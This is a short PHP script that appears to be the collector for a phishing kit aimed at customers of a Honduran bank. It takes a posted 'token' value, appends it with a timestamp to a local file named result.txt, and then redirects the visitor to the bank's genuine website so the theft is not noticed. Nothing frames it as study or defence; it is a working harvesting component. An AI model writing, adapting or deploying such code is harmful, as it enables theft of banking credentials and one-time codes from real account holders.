<?php
$token = $_POST['token'];
$fecha = date("d/m/y g:i:s");
$file = fopen ('result.txt', 'at');
fwrite($file, "token: $token  | fecha: $fecha |ip $\n");
fclose($file);
header("location:https://www.bancatlan.hn/");

?>